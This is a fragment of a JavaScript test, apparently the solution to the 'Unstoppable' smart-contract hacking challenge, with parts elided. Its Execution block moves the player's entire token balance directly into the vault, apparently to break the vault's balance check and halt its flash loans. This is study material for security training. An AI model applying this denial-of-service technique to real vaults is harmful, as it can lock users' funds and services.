...
describe('[Challenge] Unstoppable', function () {
    ...
    it('Execution', async function () {
        ...
        await token.connect(player).approve(deployer.address, INITIAL_PLAYER_TOKEN_BALANCE)
        await token.transferFrom(player.address, vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
    });
